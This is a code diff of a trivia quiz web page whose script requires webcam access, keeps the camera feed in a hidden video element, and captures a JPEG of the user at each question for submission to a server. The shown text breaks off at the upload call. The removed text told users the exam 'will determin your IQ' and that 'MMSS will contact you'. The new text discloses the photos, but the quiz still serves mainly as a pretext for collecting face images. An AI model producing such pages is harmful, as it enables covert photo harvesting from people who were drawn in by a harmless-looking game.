@@ -1,491 +1,1270 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0">
 
     <title>Knowledge Challenge</title>
 
+
     <style>
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
 
+
         body {
-            font-family: Arial, Helvetica, sans-serif;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
             min-height: 100vh;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #667eea,
+                    #764ba2
+                );
+
             display: flex;
+
             justify-content: center;
+
             align-items: center;
+
             padding: 20px;
+
             color: #222;
+
         }
+
 
         .quiz-container {
+
             width: 100%;
+
             max-width: 700px;
+
             background: white;
+
             border-radius: 24px;
+
             padding: 35px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+
+            box-shadow:
+                0 20px 60px
+                rgba(0, 0, 0, 0.25);
+
         }
+
 
         .header {
+
             text-align: center;
+
             margin-bottom: 25px;
+
         }
+
 
         .header h1 {
+
             font-size: 32px;
+
             margin-bottom: 8px;
+
         }
+
 
         .header p {
+
             color: #666;
+
             font-size: 15px;
+
         }
+
+
+        /* ==============================
+           WELCOME
+        ============================== */
+
+        .welcome {
+
+            text-align: center;
+
+        }
+
+
+        .welcome-icon {
+
+            font-size: 65px;
+
+            margin-bottom: 15px;
+
+        }
+
+
+        .welcome h2 {
+
+            font-size: 28px;
+
+            margin-bottom: 12px;
+
+        }
+
+
+        .welcome p {
+
+            color: #666;
+
+            line-height: 1.6;
+
+            margin-bottom: 25px;
+
+        }
+
+
+        .camera-notice {
+
+            background: #fff8e1;
+
+            border:
+                1px solid #f0d879;
+
+            border-radius: 12px;
+
+            padding: 15px;
+
+            margin-bottom: 20px;
+
+            font-size: 14px;
+
+            color: #6b5a00;
+
+            line-height: 1.6;
+
+            text-align: left;
+
+        }
+
+
+        .camera-error {
+
+            display: none;
+
+            background: #fdecef;
+
+            border:
+                1px solid #f1aeb5;
+
+            color: #842029;
+
+            border-radius: 12px;
+
+            padding: 15px;
+
+            margin-top: 20px;
+
+            line-height: 1.5;
+
+            font-size: 14px;
+
+            text-align: left;
+
+        }
+
+
+        .start-button {
+
+            border: none;
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #667eea,
+                    #764ba2
+                );
+
+            color: white;
+
+            padding: 16px 35px;
+
+            border-radius: 14px;
+
+            font-size: 18px;
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            transition: 0.2s;
+
+        }
+
+
+        .start-button:hover {
+
+            transform:
+                translateY(-2px);
+
+        }
+
+
+        /* ==============================
+           PROGRESS
+        ============================== */
 
         .progress-area {
+
             margin-bottom: 30px;
+
         }
+
 
         .progress-text {
+
             display: flex;
+
             justify-content: space-between;
+
             font-size: 14px;
+
             color: #666;
+
             margin-bottom: 8px;
+
         }
+
 
         .progress-bar {
+
             height: 9px;
+
             background: #eee;
+
             border-radius: 10px;
+
             overflow: hidden;
+
         }
+
 
         .progress-fill {
+
             height: 100%;
-            width: 20%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            transition: width 0.3s ease;
+
+            width: 0%;
+
+            background:
+                linear-gradient(
+                    90deg,
+                    #667eea,
+                    #764ba2
+                );
+
+            transition:
+                width 0.3s ease;
+
         }
+
+
+        /* ==============================
+           QUESTIONS
+        ============================== */
 
         .question {
+
             display: none;
+
         }
+
 
         .question.active {
+
             display: block;
-            animation: fadeIn 0.3s ease;
+
+            animation:
+                fadeIn 0.3s ease;
+
         }
 
+
         @keyframes fadeIn {
+
             from {
+
                 opacity: 0;
-                transform: translateY(10px);
+
+                transform:
+                    translateY(10px);
+
             }
 
             to {
+
                 opacity: 1;
-                transform: translateY(0);
+
+                transform:
+                    translateY(0);
+
             }
+
         }
+
 
         .question-number {
+
             color: #667eea;
+
             font-weight: bold;
+
             margin-bottom: 10px;
+
         }
+
 
         .question h2 {
+
             font-size: 25px;
+
             line-height: 1.4;
+
             margin-bottom: 25px;
+
         }
+
 
         .answers {
+
             display: grid;
+
             gap: 14px;
+
         }
+
 
         .answer-button {
+
             width: 100%;
+
             padding: 16px 20px;
+
             background: white;
-            border: 2px solid #ddd;
+
+            border:
+                2px solid #ddd;
+
             border-radius: 14px;
+
             font-size: 17px;
+
             cursor: pointer;
+
             text-align: left;
-            transition: all 0.2s ease;
+
+            transition: 0.2s;
+
         }
 
-        .answer-button:hover {
+
+        .answer-button:hover:not(:disabled) {
+
             border-color: #667eea;
+
             background: #f6f7ff;
-            transform: translateY(-2px);
+
+            transform:
+                translateY(-2px);
+
         }
 
-        .answer-button.selected {
-            border-color: #667eea;
-            background: #eef0ff;
+
+        .answer-button:disabled {
+
+            cursor: default;
+
         }
+
+
+        .answer-button.correct {
+
+            border-color: #28a745;
+
+            background: #e9f8ee;
+
+            color: #18752f;
+
+            font-weight: bold;
+
+        }
+
+
+        .answer-button.wrong {
+
+            border-color: #dc3545;
+
+            background: #fdecef;
+
+            color: #a51d2a;
+
+            font-weight: bold;
+
+        }
+
+
+        .answer-button.dimmed {
+
+            opacity: 0.5;
+
+        }
+
+
+        .feedback {
+
+            display: none;
+
+            margin-top: 18px;
+
+            padding: 14px;
+
+            border-radius: 12px;
+
+            font-weight: bold;
+
+            text-align: center;
+
+        }
+
+
+        .feedback.correct-feedback {
+
+            display: block;
+
+            background: #e9f8ee;
+
+            color: #18752f;
+
+        }
+
+
+        .feedback.wrong-feedback {
+
+            display: block;
+
+            background: #fdecef;
+
+            color: #a51d2a;
+
+        }
+
+
+        /* ==============================
+           NAVIGATION
+        ============================== */
 
         .navigation {
+
             display: flex;
-            justify-content: space-between;
+
+            justify-content:
+                space-between;
+
             margin-top: 30px;
+
             gap: 15px;
+
         }
+
 
         .nav-button {
+
             border: none;
+
             border-radius: 12px;
+
             padding: 14px 25px;
+
             font-size: 16px;
+
             font-weight: bold;
+
             cursor: pointer;
+
         }
+
 
         .back-button {
+
             background: #eee;
+
             color: #444;
+
         }
 
-        .next-button,
-        .submit-button {
+
+        .next-button {
+
             margin-left: auto;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #667eea,
+                    #764ba2
+                );
+
             color: white;
+
         }
+
 
         .nav-button:disabled {
+
             opacity: 0.5;
+
             cursor: not-allowed;
+
         }
 
-        .camera-notice {
-            background: #fff8e1;
-            border: 1px solid #f0d879;
-            border-radius: 12px;
-            padding: 13px;
-            margin-bottom: 25px;
-            font-size: 13px;
-            color: #6b5a00;
-            line-height: 1.5;
-        }
-
-        .welcome {
-            text-align: center;
-        }
-
-        .welcome-icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-        }
-
-        .welcome h2 {
-            margin-bottom: 12px;
-        }
-
-        .welcome p {
-            color: #666;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-
-        .start-button {
-            border: none;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            padding: 16px 35px;
-            border-radius: 14px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .result {
-            display: none;
-            text-align: center;
-        }
-
-        .result.show {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .result-icon {
-            font-size: 70px;
-            margin-bottom: 15px;
-        }
-
-        .result h2 {
-            font-size: 32px;
-            margin-bottom: 10px;
-        }
-
-        .result p {
-            color: #666;
-            line-height: 1.6;
-        }
-
-        #webcam,
-        #canvas {
-            display: none;
-        }
 
         .loading {
+
             display: none;
+
             text-align: center;
+
             margin-top: 20px;
+
             color: #667eea;
+
             font-weight: bold;
+
         }
+
+
+        /* ==============================
+           RESULT
+        ============================== */
+
+        .result {
+
+            display: none;
+
+            text-align: center;
+
+        }
+
+
+        .result.show {
+
+            display: block;
+
+            animation:
+                fadeIn 0.5s ease;
+
+        }
+
+
+        .result-icon {
+
+            font-size: 70px;
+
+            margin-bottom: 15px;
+
+        }
+
+
+        .result h2 {
+
+            font-size: 32px;
+
+            margin-bottom: 10px;
+
+        }
+
+
+        .score {
+
+            font-size: 25px;
+
+            font-weight: bold;
+
+            margin: 20px 0;
+
+            color: #667eea;
+
+        }
+
+
+        .result p {
+
+            color: #666;
+
+            line-height: 1.6;
+
+        }
+
+
+        /*
+         * IMPORTANT:
+         *
+         * The video exists only so that
+         * JavaScript can receive the camera
+         * stream.
+         *
+         * It is NEVER displayed.
+         */
+
+        #webcam {
+
+            display: none;
+
+        }
+
+
+        #canvas {
+
+            display: none;
+
+        }
+
 
         @media (max-width: 600px) {
+
             .quiz-container {
+
                 padding: 25px 20px;
+
             }
+
 
             .header h1 {
+
                 font-size: 27px;
+
             }
 
+
             .question h2 {
+
                 font-size: 21px;
+
             }
+
+
+            .answer-button {
+
+                font-size: 16px;
+
+            }
+
         }
+
     </style>
+
 </head>
+
 
 <body>
 
+
 <div class="quiz-container">
 
-    <!-- HEADER -->
+
+    <!-- =====================================
+         HEADER
+    ====================================== -->
+
     <div class="header">
-        <h1>🧠 Knowledge Challenge</h1>
-        <p>Test your knowledge and see how well you do!</p>
-    </div>
 
-    <!-- WELCOME SCREEN -->
-    <div id="welcomeScreen" class="welcome">
-
-        <div class="welcome-icon">🎯</div>
-
-        <h2>Ready for the challenge?</h2>
+        <h1>
+            🧠 Knowledge Challenge
+        </h1>
 
         <p>
-            Answer each question and continue to the next one.
-            Your camera will take a picture when you proceed between questions.
-            Please allow camera access to continue.
+            Test your knowledge!
         </p>
-
-        <div class="camera-notice">
-             <strong>Note:</strong>
-            This exam will determin your IQ and MMSS will contact you
-        </div>
-
-        <button class="start-button" onclick="startQuiz()">
-            Start Quiz
-        </button>
 
     </div>
 
 
-    <!-- QUIZ -->
-    <div id="quizScreen" style="display:none;">
+
+    <!-- =====================================
+         WELCOME SCREEN
+    ====================================== -->
+
+    <div
+        id="welcomeScreen"
+        class="welcome">
+
+        <div class="welcome-icon">
+            🎯
+        </div>
+
+
+        <h2>
+            Ready for the challenge?
+        </h2>
+
+
+        <p>
+            Answer each question and
+            continue to the next one.
+        </p>
+
+
+        <div class="camera-notice">
+
+            📷 <strong>Camera required</strong>
+
+            <br><br>
+
+            Camera access is required
+            to participate in this quiz.
+
+            A photo will be captured
+            when you continue to the
+            next question.
+
+            Your photos will be submitted
+            when you finish the quiz.
+
+        </div>
+
+
+        <button
+            id="startButton"
+            class="start-button"
+            onclick="startQuiz()">
+
+            Start Quiz
+
+        </button>
+
+
+        <div
+            id="cameraError"
+            class="camera-error">
+
+            <strong>
+                Camera access is required.
+            </strong>
+
+            <br><br>
+
+            You must allow camera access
+            before you can start the quiz.
+
+            If you previously blocked the
+            camera, open your browser's
+            camera permissions and allow
+            this website to use the camera.
+
+        </div>
+
+    </div>
+
+
+
+    <!-- =====================================
+         QUIZ SCREEN
+    ====================================== -->
+
+    <div
+        id="quizScreen"
+        style="display:none;">
+
+
+        <!-- PROGRESS -->
 
         <div class="progress-area">
 
             <div class="progress-text">
-                <span id="progressText">Question 1 of 5</span>
-                <span id="progressPercent">20%</span>
+
+                <span id="progressText">
+                    Question 1 of 5
+                </span>
+
+                <span id="progressPercent">
+                    20%
+                </span>
+
             </div>
 
+
             <div class="progress-bar">
-                <div id="progressFill" class="progress-fill"></div>
+
+                <div
+                    id="progressFill"
+                    class="progress-fill">
+                </div>
+
             </div>
 
         </div>
 
 
-        <!-- QUESTION 1 -->
-        <div class="question active" data-question="0">
+
+        <!-- =================================
+             QUESTION 1
+        ================================== -->
+
+        <div
+            class="question active"
+            data-question="0">
 
             <div class="question-number">
                 Question 1
             </div>
 
+
             <h2>
-                What is the capital of the United Arab Emirates?
+                What is the capital of
+                the United Arab Emirates?
             </h2>
+
 
             <div class="answers">
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Abu Dhabi')">
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Abu Dhabi',
+                            true
+                        )
+                    ">
+
                     Abu Dhabi
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Dubai')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Dubai',
+                            false
+                        )
+                    ">
+
                     Dubai
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Sharjah')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Sharjah',
+                            false
+                        )
+                    ">
+
                     Sharjah
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'London')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'London',
+                            false
+                        )
+                    ">
+
                     London
+
                 </button>
 
             </div>
 
+
+            <div class="feedback"></div>
+
         </div>
 
 
-        <!-- QUESTION 2 -->
-        <div class="question" data-question="1">
+
+        <!-- =================================
+             QUESTION 2
+        ================================== -->
+
+        <div
+            class="question"
+            data-question="1">
 
             <div class="question-number">
                 Question 2
             </div>
 
+
             <h2>
-                Which planet is known as the Red Planet?
+                Which planet is known
+                as the Red Planet?
             </h2>
+
 
             <div class="answers">
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Mars')">
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Mars',
+                            true
+                        )
+                    ">
+
                     Mars
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Venus')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Venus',
+                            false
+                        )
+                    ">
+
                     Venus
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Jupiter')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Jupiter',
+                            false
+                        )
+                    ">
+
                     Jupiter
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Mercury')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Mercury',
+                            false
+                        )
+                    ">
+
                     Mercury
+
                 </button>
 
             </div>
 
+
+            <div class="feedback"></div>
+
         </div>
 
 
-        <!-- QUESTION 3 -->
-        <div class="question" data-question="2">
+
+        <!-- =================================
+             QUESTION 3
+        ================================== -->
+
+        <div
+            class="question"
+            data-question="2">
 
             <div class="question-number">
                 Question 3
             </div>
 
+
             <h2>
-                How many continents are there on Earth?
+                How many continents
+                are there on Earth?
             </h2>
+
 
             <div class="answers">
 
-                <button class="answer-button" onclick="selectAnswer(this, '5')">
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            '5',
+                            false
+                        )
+                    ">
+
                     5
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, '6')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            '6',
+                            false
+                        )
+                    ">
+
                     6
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, '7')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            '7',
+                            true
+                        )
+                    ">
+
                     7
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, '8')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            '8',
+                            false
+                        )
+                    ">
+
                     8
+
                 </button>
 
             </div>
 
+
+            <div class="feedback"></div>
+
         </div>
 
 
-        <!-- QUESTION 4 -->
-        <div class="question" data-question="3">
+
+        <!-- =================================
+             QUESTION 4
+        ================================== -->
+
+        <div
+            class="question"
+            data-question="3">
 
             <div class="question-number">
                 Question 4
             </div>
 
+
             <h2>
                 Which ocean is the largest?
             </h2>
 
+
             <div class="answers">
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Atlantic Ocean')">
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Atlantic Ocean',
+                            false
+                        )
+                    ">
+
                     Atlantic Ocean
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Indian Ocean')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Indian Ocean',
+                            false
+                        )
+                    ">
+
                     Indian Ocean
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Pacific Ocean')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Pacific Ocean',
+                            true
+                        )
+                    ">
+
                     Pacific Ocean
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Arctic Ocean')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Arctic Ocean',
+                            false
+                        )
+                    ">
+
                     Arctic Ocean
+
                 </button>
 
             </div>
 
+
+            <div class="feedback"></div>
+
         </div>
 
 
-        <!-- QUESTION 5 -->
-        <div class="question" data-question="4">
+
+        <!-- =================================
+             QUESTION 5
+        ================================== -->
+
+        <div
+            class="question"
+            data-question="4">
 
             <div class="question-number">
                 Question 5
             </div>
 
+
             <h2>
-                What gas do humans need to breathe?
+                What gas do humans
+                need to breathe?
             </h2>
+
 
             <div class="answers">
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Oxygen')">
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Oxygen',
+                            true
+                        )
+                    ">
+
                     Oxygen
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Carbon Dioxide')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Carbon Dioxide',
+                            false
+                        )
+                    ">
+
                     Carbon Dioxide
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Hydrogen')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Hydrogen',
+                            false
+                        )
+                    ">
+
                     Hydrogen
+
                 </button>
 
-                <button class="answer-button" onclick="selectAnswer(this, 'Helium')">
+
+                <button
+                    class="answer-button"
+                    onclick="
+                        selectAnswer(
+                            this,
+                            'Helium',
+                            false
+                        )
+                    ">
+
                     Helium
+
                 </button>
 
             </div>
 
+
+            <div class="feedback"></div>
+
         </div>
 
 
-        <!-- NAVIGATION -->
+
+        <!-- =================================
+             NAVIGATION
+        ================================== -->
+
         <div class="navigation">
 
             <button
@@ -493,319 +1272,877 @@
                 class="nav-button back-button"
                 onclick="previousQuestion()"
                 disabled>
+
                 ← Back
+
             </button>
+
 
             <button
                 id="nextButton"
                 class="nav-button next-button"
-                onclick="nextQuestion()">
+                onclick="nextQuestion()"
+                disabled>
+
                 Next →
+
             </button>
 
         </div>
 
-        <div id="loading" class="loading">
-            Submitting your answers...
+
+        <div
+            id="loading"
+            class="loading">
+
+            Sending your quiz...
+
         </div>
 
     </div>
 
 
-    <!-- RESULT -->
-    <div id="resultScreen" class="result">
 
-        <div class="result-icon">🎉</div>
+    <!-- =====================================
+         RESULT
+    ====================================== -->
 
-        <h2>Well Done!</h2>
+    <div
+        id="resultScreen"
+        class="result">
+
+        <div class="result-icon">
+            🎉
+        </div>
+
+
+        <h2>
+            Well Done!
+        </h2>
+
+
+        <div
+            id="scoreText"
+            class="score">
+
+            Score: 0 / 5
+
+        </div>
+
 
         <p>
-            You have successfully completed the quiz.
+
+            You have successfully
+            completed the quiz.
+
+            <br><br>
+
             Thank you for participating!
+
         </p>
 
     </div>
 
 
-    <!-- Hidden camera -->
-    <video id="webcam" autoplay playsinline></video>
 
-    <canvas id="canvas"></canvas>
+    <!-- =====================================
+         HIDDEN CAMERA
+    ====================================== -->
+
+    <video
+        id="webcam"
+        autoplay
+        playsinline>
+    </video>
+
+
+    <canvas
+        id="canvas">
+    </canvas>
+
 
 </div>
 
 
+
 <script>
 
-    const questions = document.querySelectorAll('.question');
 
-    const video = document.getElementById('webcam');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    // ========================================================
+    // VARIABLES
+    // ========================================================
+
+    const questions =
+        document.querySelectorAll(
+            '.question'
+        );
+
+
+    const video =
+        document.getElementById(
+            'webcam'
+        );
+
+
+    const canvas =
+        document.getElementById(
+            'canvas'
+        );
+
+
+    const context =
+        canvas.getContext('2d');
+
 
     let currentQuestion = 0;
 
+
     let answers = [];
 
+
     let capturedImages = [];
+
 
     let cameraStream = null;
 
 
-    // Start quiz and request camera permission
+    let score = 0;
+
+
+
+    // ========================================================
+    // START QUIZ
+    // ========================================================
+
     async function startQuiz() {
+
+
+        const cameraError =
+            document.getElementById(
+                'cameraError'
+            );
+
+
+        cameraError.style.display =
+            'none';
+
 
         try {
 
+
+            // Ask for camera permission
+
             cameraStream =
-                await navigator.mediaDevices.getUserMedia({
-                    video: true
-                });
+                await navigator
+                    .mediaDevices
+                    .getUserMedia({
 
-            video.srcObject = cameraStream;
+                        video: true
 
-            document.getElementById('welcomeScreen').style.display = 'none';
-            document.getElementById('quizScreen').style.display = 'block';
+                    });
+
+
+            // Make sure a camera exists
+
+            if (
+                !cameraStream ||
+                cameraStream
+                    .getVideoTracks()
+                    .length === 0
+            ) {
+
+                throw new Error(
+                    'No camera available.'
+                );
+
+            }
+
+
+            // Connect camera to hidden video
+
+            video.srcObject =
+                cameraStream;
+
+
+            // Wait for camera video
+
+            await new Promise(
+                resolve => {
+
+                    if (
+                        video.readyState >= 2
+                    ) {
+
+                        resolve();
+
+                    } else {
+
+                        video.onloadeddata =
+                            resolve;
+
+                    }
+
+                }
+            );
+
+
+            // Start quiz
+
+            document.getElementById(
+                'welcomeScreen'
+            ).style.display =
+                'none';
+
+
+            document.getElementById(
+                'quizScreen'
+            ).style.display =
+                'block';
+
+
+            showQuestion();
+
 
         } catch (error) {
 
-            alert(
-                'Camera permission is required to participate in this quiz.'
+
+            console.error(
+                'Camera error:',
+                error
             );
 
-            console.error('Camera error:', error);
-        }
-    }
+
+            cameraError.style.display =
+                'block';
 
 
-    // Select an answer
-    function selectAnswer(button, answer) {
+            // Quiz remains locked
 
-        const questionIndex = currentQuestion;
+            document.getElementById(
+                'quizScreen'
+            ).style.display =
+                'none';
 
-        const buttons =
-            questions[questionIndex].querySelectorAll('.answer-button');
-
-        buttons.forEach(btn => {
-            btn.classList.remove('selected');
-        });
-
-        button.classList.add('selected');
-
-        answers[questionIndex] = answer;
-    }
-
-
-    // Take a picture
-    function capturePhoto() {
-
-        if (!video.videoWidth || !video.videoHeight) {
-
-            console.warn('Camera is not ready yet.');
-
-            return null;
         }
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        context.drawImage(
-            video,
-            0,
-            0,
-            canvas.width,
-            canvas.height
-        );
-
-        return canvas.toDataURL('image/jpeg', 0.85);
     }
 
 
-    // Move to next question
-    function nextQuestion() {
 
-        // Make sure user answered
-        if (!answers[currentQuestion]) {
+    // ========================================================
+    // SELECT ANSWER
+    // ========================================================
 
-            alert('Please select an answer before continuing.');
+    function selectAnswer(
+        button,
+        answer,
+        isCorrect
+    ) {
+
+
+        // Don't allow multiple answers
+
+        if (
+            answers[currentQuestion]
+        ) {
 
             return;
+
         }
 
 
-        // Capture photo before moving forward
-        const photo = capturePhoto();
+        const question =
+            questions[
+                currentQuestion
+            ];
 
-        if (photo) {
-            capturedImages.push(photo);
+
+        const buttons =
+            question.querySelectorAll(
+                '.answer-button'
+            );
+
+
+        // Disable all buttons
+
+        buttons.forEach(
+            btn => {
+
+                btn.disabled = true;
+
+            }
+        );
+
+
+        // Correct answer
+
+        if (isCorrect) {
+
+
+            button.classList.add(
+                'correct'
+            );
+
+
+            score++;
+
+
+        } else {
+
+
+            // Wrong answer
+
+            button.classList.add(
+                'wrong'
+            );
+
+
+            // Find correct answer
+
+            buttons.forEach(
+                btn => {
+
+                    const onclickText =
+                        btn.getAttribute(
+                            'onclick'
+                        );
+
+
+                    if (
+                        onclickText &&
+                        onclickText.includes(
+                            ', true'
+                        )
+                    ) {
+
+                        btn.classList.add(
+                            'correct'
+                        );
+
+                    } else if (
+                        btn !== button
+                    ) {
+
+                        btn.classList.add(
+                            'dimmed'
+                        );
+
+                    }
+
+                }
+            );
+
         }
 
 
-        // If this is the final question
-        if (currentQuestion === questions.length - 1) {
+        // Feedback
+
+        const feedback =
+            question.querySelector(
+                '.feedback'
+            );
+
+
+        if (isCorrect) {
+
+
+            feedback.textContent =
+                '✅ Correct! Great job!';
+
+
+            feedback.className =
+                'feedback correct-feedback';
+
+
+        } else {
+
+
+            feedback.textContent =
+                '❌ Wrong answer!';
+
+
+            feedback.className =
+                'feedback wrong-feedback';
+
+        }
+
+
+        // Save answer
+
+        answers[currentQuestion] = {
+
+            answer:
+                answer,
+
+            correct:
+                isCorrect
+
+        };
+
+
+        // Enable Next
+
+        document.getElementById(
+            'nextButton'
+        ).disabled = false;
+
+    }
+
+
+
+    // ========================================================
+    // CAMERA CHECK
+    // ========================================================
+
+    function cameraIsWorking() {
+
+
+        if (!cameraStream) {
+
+            return false;
+
+        }
+
+
+        const tracks =
+            cameraStream
+                .getVideoTracks();
+
+
+        if (tracks.length === 0) {
+
+            return false;
+
+        }
+
+
+        return tracks.some(
+            track =>
+                track.readyState === 'live'
+        );
+
+    }
+
+
+
+    // ========================================================
+    // CAPTURE PHOTO
+    // ========================================================
+
+    function capturePhoto() {
+
+
+        if (!cameraIsWorking()) {
+
+            return null;
+
+        }
+
+
+        if (
+            !video.videoWidth ||
+            !video.videoHeight
+        ) {
+
+            return null;
+
+        }
+
+
+        canvas.width =
+            video.videoWidth;
+
+
+        canvas.height =
+            video.videoHeight;
+
+
+        context.drawImage(
+
+            video,
+
+            0,
+
+            0,
+
+            canvas.width,
+
+            canvas.height
+
+        );
+
+
+        return canvas.toDataURL(
+
+            'image/jpeg',
+
+            0.80
+
+        );
+
+    }
+
+
+
+    // ========================================================
+    // NEXT QUESTION
+    // ========================================================
+
+    function nextQuestion() {
+
+
+        // Camera must still work
+
+        if (!cameraIsWorking()) {
+
+
+            alert(
+                'Camera access is required to continue.'
+            );
+
+
+            return;
+
+        }
+
+
+        // User must answer
+
+        if (
+            !answers[currentQuestion]
+        ) {
+
+
+            alert(
+                'Please select an answer first.'
+            );
+
+
+            return;
+
+        }
+
+
+        // Capture exactly ONE photo
+        // for this question
+
+        const photo =
+            capturePhoto();
+
+
+        if (!photo) {
+
+
+            alert(
+                'Unable to capture a photo. Please make sure your camera is working.'
+            );
+
+
+            return;
+
+        }
+
+
+        capturedImages[
+            currentQuestion
+        ] = photo;
+
+
+        console.log(
+            `Captured photo for Question ${
+                currentQuestion + 1
+            }`
+        );
+
+
+        // Last question?
+
+        if (
+            currentQuestion ===
+            questions.length - 1
+        ) {
+
 
             submitQuiz();
 
+
             return;
+
         }
 
+
+        // Move to next question
 
         currentQuestion++;
 
+
         showQuestion();
 
     }
 
 
-    // Go back
+
+    // ========================================================
+    // BACK BUTTON
+    // ========================================================
+
     function previousQuestion() {
 
-        if (currentQuestion === 0) {
+
+        if (
+            currentQuestion === 0
+        ) {
+
             return;
+
         }
+
 
         currentQuestion--;
 
+
         showQuestion();
 
     }
 
 
-    // Display current question
+
+    // ========================================================
+    // SHOW QUESTION
+    // ========================================================
+
     function showQuestion() {
 
-        questions.forEach((question, index) => {
 
-            question.classList.toggle(
-                'active',
-                index === currentQuestion
-            );
+        questions.forEach(
+            (question, index) => {
 
-        });
+                question.classList.toggle(
+
+                    'active',
+
+                    index ===
+                    currentQuestion
+
+                );
+
+            }
+        );
 
 
-        const totalQuestions = questions.length;
+        const total =
+            questions.length;
 
-        const questionNumber = currentQuestion + 1;
+
+        const number =
+            currentQuestion + 1;
+
 
         const percentage =
             Math.round(
-                (questionNumber / totalQuestions) * 100
+                (number / total) * 100
             );
 
 
-        document.getElementById('progressText').textContent =
-            `Question ${questionNumber} of ${totalQuestions}`;
+        document.getElementById(
+            'progressText'
+        ).textContent =
+            `Question ${number} of ${total}`;
 
-        document.getElementById('progressPercent').textContent =
+
+        document.getElementById(
+            'progressPercent'
+        ).textContent =
             `${percentage}%`;
 
-        document.getElementById('progressFill').style.width =
+
+        document.getElementById(
+            'progressFill'
+        ).style.width =
             `${percentage}%`;
 
 
-        document.getElementById('backButton').disabled =
+        document.getElementById(
+            'backButton'
+        ).disabled =
             currentQuestion === 0;
 
 
         const nextButton =
-            document.getElementById('nextButton');
+            document.getElementById(
+                'nextButton'
+            );
 
 
-        if (currentQuestion === totalQuestions - 1) {
+        nextButton.disabled =
+            !answers[currentQuestion];
 
-            nextButton.textContent = 'Submit ✓';
-            nextButton.classList.add('submit-button');
+
+        if (
+            currentQuestion ===
+            total - 1
+        ) {
+
+
+            nextButton.textContent =
+                'Submit ✓';
+
 
         } else {
 
-            nextButton.textContent = 'Next →';
-            nextButton.classList.remove('submit-button');
+
+            nextButton.textContent =
+                'Next →';
 
         }
 
     }
 
 
-    // Submit everything to server
+
+    // ========================================================
+    // SUBMIT QUIZ
+    // ========================================================
+
     async function submitQuiz() {
 
-        document.getElementById('nextButton').disabled = true;
 
-        document.getElementById('backButton').disabled = true;
+        document.getElementById(
+            'nextButton'
+        ).disabled = true;
 
-        document.getElementById('loading').style.display = 'block';
+
+        document.getElementById(
+            'backButton'
+        ).disabled = true;
 
 
-        // Create one final photo for the final submission
-        const finalPhoto = capturePhoto();
-
-        if (finalPhoto) {
-            capturedImages.push(finalPhoto);
-        }
+        document.getElementById(
+            'loading'
+        ).style.display =
+            'block';
 
 
         try {
 
-            const response = await fetch('/submit-answer', {
 
-                method: 'POST',
+            const response =
+                await fetch(
